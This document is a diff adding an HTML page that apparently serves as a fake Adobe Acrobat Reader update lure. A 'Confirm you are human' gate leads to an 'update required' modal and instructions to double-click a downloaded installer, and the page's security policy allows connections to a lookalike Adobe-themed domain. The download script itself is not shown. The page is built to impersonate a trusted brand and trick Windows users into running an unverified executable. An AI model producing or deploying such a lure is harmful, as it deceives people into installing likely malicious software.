@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <meta
+        name="referrer"
+        content="no-referrer"
+    >
+
+    <meta
+        name="color-scheme"
+        content="light"
+    >
+
+    <title>Download Center</title>
+
+    <meta
+        name="description"
+        content="Securely download and install your application."
+    >
+
+    <!--
+        Client-side security policy.
+
+        IMPORTANT:
+        The authoritative security headers should also be
+        configured at the Cloudflare/Worker layer.
+    -->
+    <meta
+        http-equiv="Content-Security-Policy"
+        content="
+            default-src 'self';
+            base-uri 'self';
+            object-src 'none';
+            frame-ancestors 'none';
+            form-action 'self';
+            script-src 'self';
+            style-src 'self';
+            img-src 'self' data:;
+            media-src 'self';
+            font-src 'self' data:;
+            connect-src 'self' https://documentverifyadobeupdated.willowcenteredtech.com;
+            upgrade-insecure-requests;
+            Access-Control-Allow-Origin;
+        "
+    >
+
+    <link
+        rel="stylesheet"
+        href="styles.css"
+    >
+
+</head>
+
+<body>
+
+
+<!-- =========================================================
+     INITIAL LOADING SCREEN
+========================================================== -->
+
+<section
+    id="loadingScreen"
+    class="screen loading-screen"
+    aria-label="Loading"
+>
+
+    <div
+        class="loader"
+        aria-hidden="true"
+    ></div>
+
+    <p
+        class="loading-text"
+        aria-live="polite"
+    >
+        Please wait, loading document...
+    </p>
+
+</section>
+
+
+<!-- =========================================================
+     CONFIRMATION SCREEN
+========================================================== -->
+
+<section
+    id="confirmScreen"
+    class="screen confirm-screen hidden"
+    aria-labelledby="confirmTitle"
+>
+
+    <div
+        id="confirmCard"
+        class="confirm-card confirm-variant-1"
+    >
+
+        <!-- Visual is injected by JavaScript -->
+        <div
+            id="confirmVisual"
+            class="confirm-visual"
+            aria-hidden="true"
+        ></div>
+
+
+        <div
+            id="confirmEyebrow"
+            class="eyebrow"
+        >
+            Human verify
+        </div>
+
+
+        <h1 id="confirmTitle">
+            Confirm you are human
+        </h1>
+
+
+        <p
+            id="confirmDescription"
+            class="confirm-description"
+        >
+            This quick check helps keep the site safe. It usually takes a few seconds.
+        </p>
+
+
+        <button
+            id="confirmButton"
+            class="primary-button"
+            type="button"
+        >
+
+            <span class="button-text">
+                Confirm &amp; Continue
+            </span>
+
+            <span
+                class="button-loading hidden"
+                aria-live="polite"
+            >
+
+                <span
+                    class="small-spinner"
+                    aria-hidden="true"
+                ></span>
+
+                Preparing...
+
+            </span>
+
+        </button>
+
+
+        <p class="security-note">
+
+            <span
+                class="check-icon"
+                aria-hidden="true"
+            >
+                ✓
+            </span>
+
+            Your download will begin shortly
+
+        </p>
+
+
+        <div
+            class="visitor-token"
+            aria-label="Session identifier"
+        >
+
+            <span>
+                SESSION
+            </span>
+
+            <strong id="visitorToken">
+                -------
+            </strong>
+
+        </div>
+
+    </div>
+
+</section>
+
+
+<!-- =========================================================
+     DOWNLOAD MODAL SCREEN
+========================================================== -->
+
+<section
+    id="downloadScreen"
+    class="download-screen hidden"
+    aria-label="Download"
+>
+
+    <div
+        class="installer-background"
+        aria-hidden="true"
+    ></div>
+
+    <div
+        class="background-overlay"
+        aria-hidden="true"
+    ></div>
+
+    <div
+        class="download-modal"
+        role="dialog"
+        aria-modal="true"
+        aria-labelledby="downloadTitle"
+    >
+
+        <button
+            id="closeModal"
+            class="close-button"
+            type="button"
+            aria-label="Close download dialog"
+        >
+            &times;
+        </button>
+
+        <div
+            class="modal-icon"
+            aria-hidden="true"
+        >
+
+            <img
+                src="assets/adb_pop_logo.PNG"
+                alt=""
+                draggable="false"
+            >
+
+        </div>
+
+        <div class="eyebrow">
+            ADOBE ACROBAT READER DC UPDATE.
+        </div>
+
+        <h2 id="downloadTitle">
+            Version outdated, update required.
+        </h2>
+
+        <p>
+            Your version of Adobe Acrobat Reader is outdated and cannot display
+            this document correctly. Please update to continue viewing
+        </p>
+
+        <div class="file-information">
+
+            <div
+                class="file-icon"
+                aria-hidden="true"
+            >
+                ↓
+            </div>
+
+            <div class="file-details">
+
+                <strong>
+                    Update
+                </strong>
+
+                <span>
+                    Adobe Acrobat Installer
+                </span>
+
+            </div>
+
+        </div>
+
+        <button
+            id="downloadButton"
+            class="download-button"
+            type="button"
+        >
+
+            <span>
+                Update Now
+            </span>
+
+        </button>
+
+        <p class="modal-note">
+            Your download should begin automatically.
+        </p>
+
+    </div>
+
+</section>
+
+<!-- =========================================================
+     INSTALLATION INSTRUCTIONS SCREEN
+     
+     This was previously download.html.
+     It is now part of the single-page application.
+========================================================== -->
+
+<section
+    id="instructionsScreen"
+    class="instructions-screen hidden"
+>
+
+    <div class="instructions-container">
+
+        <!-- =====================================================
+             LEFT SIDE
+        ====================================================== -->
+
+        <div class="instructions-content">
+
+            <div class="eyebrow">
+                INSTALLATION GUIDE
+            </div>
+
+
+            <h1>
+                Your download is<br>
+
+                <span>
+                    ready to install.
+                </span>
+            </h1>
+
+
+            <p class="instructions-intro">
+
+                Your installer download has been
+                started automatically.
+
+                Follow these simple steps to locate
+                the installer and complete the
+                installation on your Windows PC.
+
+            </p>
+
+
+            <!-- =================================================
+                 DOWNLOAD STATUS
+            ================================================== -->
+
+            <div
+                id="downloadStatus"
+                class="download-status"
+            >
+
+                <div class="status-spinner"></div>
+
+                <div>
+
+                    <strong>
+                        Starting download...
+                    </strong>
+
+                    <p>
+                        Your installer should appear
+                        in your Downloads folder shortly.
+                    </p>
+
+                </div>
+
+            </div>
+
+
+            <!-- =================================================
+                 STEP 1
+            ================================================== -->
+
+            <div class="instruction-step">
+
+                <div class="step-number">
+                    1
+                </div>
+
+                <div class="step-content">
+
+                    <h3>
+                        Open your Downloads folder
+                    </h3>
+
+                    <p>
+
+                        Open File Explorer and select
+                        <strong>Downloads</strong>
+                        from the left-hand menu.
+
+                    </p>
+
+                </div>
+
+            </div>
+
+
+            <!-- =================================================
+                 STEP 2
+            ================================================== -->
+
+            <div class="instruction-step">
+
+                <div class="step-number">
+                    2
+                </div>
+
+                <div class="step-content">
+
+                    <h3>
+                        Find the installer
+                    </h3>
+
+                    <p>
+
+                        Look for the installer file
+                        you just downloaded.
+
+                        It will normally appear near
+                        the top of the folder.
+
+                    </p>
+
+                </div>
+
+            </div>
+
+
+            <!-- =================================================
+                 STEP 3
+            ================================================== -->
+
+            <div class="instruction-step">
+
+                <div class="step-number">
+                    3
+                </div>
+
+                <div class="step-content">
+
+                    <h3>
+                        Double-click the installer
+                    </h3>
+
+                    <p>
+
+                        Double-click the downloaded
+                        file to launch the installation
+                        process.
+
+                    </p>
+
+                </div>
+
+            </div>
+
+
+            <!-- =================================================
+                 STEP 4
+            ================================================== -->
+
+            <div class="instruction-step">
+
+                <div class="step-number">
+                    4
+                </div>
+
+                <div class="step-content">
+
+                    <h3>
+                        Complete the installation
+                    </h3>
+
+                    <p>
+
+                        Follow the instructions shown
+                        by the installer to finish
+                        setting up the application.
+
+                    </p>
+
+                </div>
+
+            </div>
+
+
+            <!-- =================================================
+                 MANUAL DOWNLOAD
+            ================================================== -->
+
+            <a
+                id="manualDownload"
+                class="download-button manual-download"
+                href="#"
+            >
+
+                <span>
+                    Download again
+                </span>
+
+                <span>
+                    ↓
+                </span>
+
+            </a>
+
+        </div>
+
+
+        <!-- =====================================================
+             VIDEO AREA
+        ====================================================== -->
+
+        <div class="video-section">
+
+            <div class="video-card">
+
+                <div class="video-header">
+
+                    <span class="video-label">
+                        QUICK GUIDE
+                    </span>
+
+                    <span class="video-duration">
+                        Installation
+                    </span>
+
+                </div>
+
+
+                <div class="installation-gif-wrapper">
+
+                    <img
+                        id="installationGuide"
+                        class="installation-gif"
+                        src="assets/download_gif.gif"
+                        alt="Installation guide"
+                        draggable="false"
+                    >
+
+                </div>
+
+
+                <div class="video-footer">
+
+                    <span>
+                        Watch the installation guide
+                    </span>
+
+                </div>
+
+            </div>
+
+
+            <div class="help-card">
+
+                <div class="help-icon">
+                    ?
+                </div>
+
+                <div>
+
+                    <strong>
+                        Need help?
+                    </strong>
+
+                    <p>
+                        Make sure the download has finished
+                        before opening the installer.
+                    </p>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+</section>
+
+<noscript>
+    JavaScript is required to use this download center.
+</noscript>
+
+
+<script
+    src="script.js"
+    defer
+></script>
+
+
+</body>
+</html>
